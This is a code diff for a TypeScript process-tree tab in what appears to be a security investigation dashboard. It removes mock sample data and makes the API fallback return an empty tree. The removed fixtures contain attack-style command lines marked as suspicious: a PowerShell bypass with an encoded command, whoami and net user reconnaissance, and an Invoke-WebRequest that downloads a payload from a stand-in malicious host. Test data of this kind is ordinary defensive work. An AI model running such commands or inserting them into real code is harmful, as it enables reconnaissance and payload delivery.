@@ -8,61 +8,6 @@ interface ProcessTreeResponse {
   roots: ProcessNode[];
 }
 
-// Sample data when API not available
-const SAMPLE_ROOTS: ProcessNode[] = [
-  {
-    guid: "root-1",
-    pid: 4,
-    name: "System",
-    suspicious: false,
-    children: [
-      {
-        guid: "svc-1",
-        pid: 1012,
-        name: "svchost.exe",
-        commandLine: "C:\\Windows\\system32\\svchost.exe -k netsvcs",
-        signer: "Microsoft Corporation",
-        imageHash: "abc123def456",
-        suspicious: false,
-        children: [],
-      },
-    ],
-  },
-  {
-    guid: "root-2",
-    pid: 3820,
-    name: "powershell.exe",
-    commandLine: "powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdA==",
-    suspicious: true,
-    children: [
-      {
-        guid: "child-1",
-        pid: 4904,
-        name: "cmd.exe",
-        commandLine: "cmd.exe /c whoami && net user",
-        suspicious: true,
-        children: [
-          {
-            guid: "child-2",
-            pid: 5120,
-            name: "net.exe",
-            commandLine: "net user /domain",
-            suspicious: true,
-            children: [],
-          },
-        ],
-      },
-      {
-        guid: "child-3",
-        pid: 5220,
-        name: "Invoke-WebRequest",
-        commandLine: "iwr http://malicious.example.com/payload -outfile C:\\temp\\p.exe",
-        suspicious: true,
-        children: [],
-      },
-    ],
-  },
-];
 
 interface Props {
   id: string;
@@ -74,9 +19,10 @@ export function ProcessTreeTab({ id, isActive }: Props) {
     queryKey: ["inv-process-tree", id],
     queryFn: () =>
       apiClient
-        .get<ProcessTreeResponse>(`/investigations/${id}/process-tree`)
-        .then((r) => r.data)
-        .catch(() => ({ roots: SAMPLE_ROOTS })),
+        .get<{ data: ProcessTreeResponse }>(`/investigations/${id}/process-tree`)
+        // eslint-disable-next-line @typescript-eslint/no-explicit-any
+        .then((r) => (r.data as any).data ?? r.data)
+        .catch(() => ({ roots: [] as ProcessNode[] })),
     enabled: isActive,
     staleTime: 120_000,
   });
